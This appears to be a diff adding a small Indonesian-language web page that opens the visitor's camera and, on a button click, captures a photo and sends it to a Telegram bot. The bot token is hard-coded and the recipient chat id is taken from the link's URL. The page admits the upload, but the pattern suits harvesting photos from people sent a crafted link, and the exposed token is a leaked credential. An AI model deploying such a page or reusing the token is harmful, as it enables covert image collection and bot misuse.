@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Akses Kamera</title>
+</head>
+<body>
+  <h3>Ambil Foto dan Kirim ke Telegram</h3>
+  <video id="video" autoplay></video>
+  <br>
+  <button onclick="takePhoto()">📸 Ambil Foto</button>
+  <canvas id="canvas" style="display:none;"></canvas>
+  <script>
+    const video = document.getElementById('video');
+    navigator.mediaDevices.getUserMedia({ video: true }).then((stream) => {
+      video.srcObject = stream;
+    });
+
+    function takePhoto() {
+      const canvas = document.getElementById('canvas');
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      canvas.getContext('2d').drawImage(video, 0, 0);
+      const dataUrl = canvas.toDataURL('image/jpeg');
+
+      const params = new URLSearchParams(window.location.search);
+      const userId = params.get('id');
+      
+      fetch('https://api.telegram.org/bot7118007520:AAHLBLu9GTXzvzyHKiO8lxr3CFNKClsT3iE/sendPhoto', {
+        method: 'POST',
+        body: new URLSearchParams({
+          chat_id: userId,
+          photo: dataUrl
+        })
+      }).then(() => {
+        alert("📤 Foto dikirim ke bot Telegram!");
+      });
+    }
+  </script>
+</body>
+</html>
